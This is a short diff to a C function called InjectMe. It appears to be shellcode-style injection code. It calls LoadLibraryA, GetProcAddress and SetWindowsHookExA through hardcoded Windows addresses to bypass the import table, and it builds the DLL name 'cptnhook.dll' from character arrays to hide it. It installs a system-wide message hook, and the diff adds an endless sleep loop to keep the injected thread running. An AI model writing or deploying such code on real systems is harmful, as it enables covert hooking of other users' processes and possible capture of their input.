@@ -9,10 +9,11 @@ DWORD WINAPI InjectMe(LPVOID lpParameter){
 	typedef DWORD(*_GetLastError)();
 	char hookProc[] = {'H','o','o','k','P','r','o','c',0};
 	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',0};
+	BOOL _true = TRUE;
 
 	//0x7c801d7b - LoadLibraryA - Skip IAT - kernel32
 	_LoadLibrary ll = (_LoadLibrary)0x7c801d7b;
-	//0x7c80ae40 - GetProcAddress - Skip IAT - kernel32
+	//0x7c80ae40 / 0x7c80ae30 - GetProcAddress - Skip IAT - kernel32
 	//_GetProcAddress gpa = (_GetProcAddress)0x7c80ae40;
 	_GetProcAddress gpa = (_GetProcAddress)0x7c80ae30;
 	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
@@ -32,7 +33,9 @@ DWORD WINAPI InjectMe(LPVOID lpParameter){
 		return (DWORD)-2;
 	}
 	swh(WH_GETMESSAGE, installProc, hMod, 0);
-	slp(0x0FFFFFF);
+	while (_true) {
+		slp(0x0FFFFFF);
+	}
 	return 0;
 }
 int main (){return InjectMe((LPVOID)NULL);}
